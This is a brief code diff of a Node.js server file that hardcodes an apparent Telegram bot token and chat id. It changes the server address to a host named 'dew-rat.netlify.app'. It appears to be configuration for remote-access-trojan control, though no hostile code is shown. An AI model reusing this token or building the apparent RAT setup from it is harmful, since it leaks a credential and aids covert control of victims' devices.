@@ -9,7 +9,7 @@ const axios = require("axios");
 
 const token = '7576283920:AAEkZX13qyOJLaoL3FHw6HTtgBC7TCRtv5g'
 const id = '7979666362'
-const address = 'https://dewapinew.netlify.app/'
+const address = 'https://dew-rat.netlify.app/'
 
 const app = express();
 const appServer = http.createServer(app);
